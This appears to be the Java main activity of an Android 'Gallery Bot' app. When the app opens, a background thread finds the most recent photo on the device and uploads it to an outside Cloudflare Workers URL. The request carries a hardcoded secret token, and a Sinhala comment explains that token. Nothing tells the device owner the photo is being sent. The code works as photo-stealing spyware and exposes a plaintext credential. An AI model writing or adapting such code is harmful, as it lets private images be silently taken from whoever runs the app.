package com.example.botapp;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Gallery Bot Running...");
        setContentView(tv);

        sendLatestPhoto(CF_URL);
    }

    private void sendLatestPhoto(String targetUrl) {
        new Thread(() -> {
            try {
                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                String[] projection = {MediaStore.Images.Media.DATA};
                Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

                if (cursor != null) {
                    if (cursor.moveToFirst()) {
                        int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                        String path = cursor.getString(index);
                        if (path != null) {
                            File file = new File(path);
                            if (file.exists()) {
                                uploadImage(targetUrl, file);
                            }
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void uploadImage(String targetUrl, File file) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            
            // මෙන්න මෙතැනට ඔයාගේ පාස්වර්ඩ් එක දෙන්න (Cloudflare Worker එකට දුන් එකම විය යුතුය)
            conn.setRequestProperty("X-Secret-Token", "sabeer@1163");
            
            conn.setRequestProperty("Content-Type", "application/octet-stream");

            OutputStream out = conn.getOutputStream();
            FileInputStream in = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            in.close();
            out.flush();
            out.close();
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

